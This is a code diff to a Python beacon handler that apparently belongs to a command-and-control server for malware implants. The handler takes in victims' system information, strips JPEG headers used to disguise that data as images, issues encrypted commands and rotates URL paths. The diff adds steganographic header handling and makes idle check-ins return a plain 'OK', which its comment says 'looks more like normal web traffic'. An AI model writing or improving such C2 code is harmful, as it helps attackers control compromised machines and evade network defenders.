@@ -35,15 +35,33 @@ class BeaconHandler(BaseHandler):
                 system_info_raw = body_data.get('data')
                 rotation_id = body_data.get('rotation_id')
                 
-                # Strip JPEG headers if present
+                # Process JPEG headers if present in either binary or text form
                 if system_info_raw and isinstance(system_info_raw, str):
-                    # Check for JPEG header patterns
-                    if system_info_raw.startswith("0xFFD8FF"):
-                        system_info_raw = system_info_raw[8:]  # Remove the exact 8 characters
-                        self.log_message(f"Removed JPEG header prefix '0xFFD8FF' from data")
-                    elif system_info_raw.startswith("FFD8FF"):
-                        system_info_raw = system_info_raw[6:]  # Remove the exact 6 characters
-                        self.log_message(f"Removed JPEG header prefix 'FFD8FF' from data")
+                    try:
+                        # Try to decode base64 to check for binary JPEG header
+                        try:
+                            decoded_data = base64.b64decode(system_info_raw)
+                            # Check for JPEG header bytes (0xFF 0xD8 0xFF)
+                            if len(decoded_data) > 3 and decoded_data[0] == 0xFF and decoded_data[1] == 0xD8 and decoded_data[2] == 0xFF:
+                                # Remove the JPEG header (first 3 bytes)
+                                decoded_data = decoded_data[3:]
+                                self.log_message(f"Removed binary JPEG header from data")
+                                
+                                # Re-encode to base64 for decryption
+                                system_info_raw = base64.b64encode(decoded_data).decode('utf-8')
+                        except Exception as e:
+                            # If it's not valid base64 or has no header, continue with text checks
+                            self.log_message(f"Not a valid base64 with binary JPEG header: {str(e)}")
+                            
+                        # Text-based header checks as fallback
+                        if system_info_raw.startswith("0xFFD8FF"):
+                            system_info_raw = system_info_raw[8:]  # Remove the exact 8 characters
+                            self.log_message(f"Removed text JPEG header '0xFFD8FF' from data")
+                        elif system_info_raw.startswith("FFD8FF"):
+                            system_info_raw = system_info_raw[6:]  # Remove the exact 6 characters
+                            self.log_message(f"Removed text JPEG header 'FFD8FF' from data")
+                    except Exception as e:
+                        self.log_message(f"Error processing potential JPEG headers: {str(e)}")
                 
                 # Log the received client ID to verify
                 self.log_message(f"Client ID from request body: {client_id}")
@@ -98,43 +116,49 @@ class BeaconHandler(BaseHandler):
     
     def _send_beacon_response(self, client_id, commands, has_key_operation, first_contact, include_rotation_info):
         """Send the response to the client beacon"""
-        # Prepare response data
-        response_data = {
-            "commands": commands,
-            "first_contact": first_contact,
-            "encrypted": False
-        }
-        
-        # Add key operation flags
-        if has_key_operation:
-            if first_contact:
-                response_data["key_issuance"] = True
-            else:
-                response_data["key_rotation"] = True
-        
-        # Add path rotation info if requested - NOW INCLUDED IN RESPONSE BODY
-        if include_rotation_info:
-            rotation_info = self.path_router.get_rotation_info()
-            response_data["rotation_info"] = rotation_info
-        else:
-            # Always include basic rotation info for established clients
-            rotation_info = {
-                "current_rotation_id": self.path_router.path_manager.rotation_counter,
-                "next_rotation_time": self.path_router.path_manager.get_next_rotation_time()
+        # For first contact or key operations, we need to send more detailed information
+        if first_contact or has_key_operation or include_rotation_info or commands:
+            # Prepare response data
+            response_data = {
+                "commands": commands,
+                "first_contact": first_contact,
+                "encrypted": False
             }
-            response_data["rotation_info"] = rotation_info
-        
-        # For established clients with encryption, encrypt the commands
-        if not first_contact and commands:
-            # Convert commands to JSON string for encryption
-            commands_json = json.dumps(commands)
             
-            # Encrypt the commands
-            encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
+            # Add key operation flags only if needed
+            if has_key_operation:
+                if first_contact:
+                    response_data["key_issuance"] = True
+                else:
+                    response_data["key_rotation"] = True
             
-            # Replace commands with encrypted version
-            response_data["commands"] = encrypted_commands
-            response_data["encrypted"] = True
-        
-        # Send the response as JSON
-        self.send_response(200, "application/json", json.dumps(response_data))
+            # Add path rotation info if requested - NOW INCLUDED IN RESPONSE BODY
+            if include_rotation_info:
+                rotation_info = self.path_router.get_rotation_info()
+                response_data["rotation_info"] = rotation_info
+            else:
+                # Only include minimal rotation info if needed
+                rotation_info = {
+                    "current_rotation_id": self.path_router.path_manager.rotation_counter,
+                    "next_rotation_time": self.path_router.path_manager.get_next_rotation_time()
+                }
+                response_data["rotation_info"] = rotation_info
+            
+            # For established clients with encryption, encrypt the commands
+            if not first_contact and commands:
+                # Convert commands to JSON string for encryption
+                commands_json = json.dumps(commands)
+                
+                # Encrypt the commands
+                encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
+                
+                # Replace commands with encrypted version
+                response_data["commands"] = encrypted_commands
+                response_data["encrypted"] = True
+            
+            # Send the response as JSON
+            self.send_response(200, "application/json", json.dumps(response_data))
+        else:
+            # For regular check-ins with no commands, just send a simple "OK" response
+            # This looks more like normal web traffic
+            self.send_response(200, "text/plain", "OK")
